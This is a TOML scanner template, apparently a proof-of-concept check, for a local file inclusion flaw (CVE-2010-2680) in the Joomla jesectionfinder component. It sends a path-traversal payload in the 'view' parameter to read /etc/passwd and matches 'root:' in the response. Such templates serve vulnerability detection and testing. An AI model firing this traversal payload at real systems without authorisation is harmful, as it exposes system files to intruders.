[info]
author = "ave"
description = "Joomla! jesectionfinder 组件目录遍历漏洞 PoC，通过 view 参数传入 ../../../../etc/passwd 路径遍历序列读取系统本地文件"
id = "POC-AVE-2010-0098"
name = "Joomla! Component jesectionfinder Local File Inclusion PoC"
severity = "medium"
tags = ["cve-2010-2680", "ave-2010-0098", "joomla", "lfi"]
vuln_id = ["CVE-2010-2680", "AVE-2010-0098"]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/propertyfinder/component/jesectionfinder/?view=../../../../../../../../../../../../../etc/passwd"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
